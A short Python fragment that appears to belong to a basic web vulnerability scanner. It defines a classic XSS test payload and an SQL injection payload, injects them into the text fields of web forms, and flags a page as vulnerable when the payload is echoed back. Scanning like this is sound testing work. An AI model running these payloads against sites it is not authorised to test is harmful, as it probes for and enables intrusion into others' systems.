import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOAD = "' OR '1'='1"


def submit_form(form_details, url, payload, vulnerable_type=""):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        input_name = input["name"]
        input_type = input["type"]
        if input_name:
            if input_type == "text":
                data[input_name] = payload
            elif input_type != "submit":
                data[input_name] = "test"

    print(f"[+] Submitting to {target_url} with {vulnerable_type} payload...")
    
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def is_vulnerable(response, payload):
    return payload in response.text

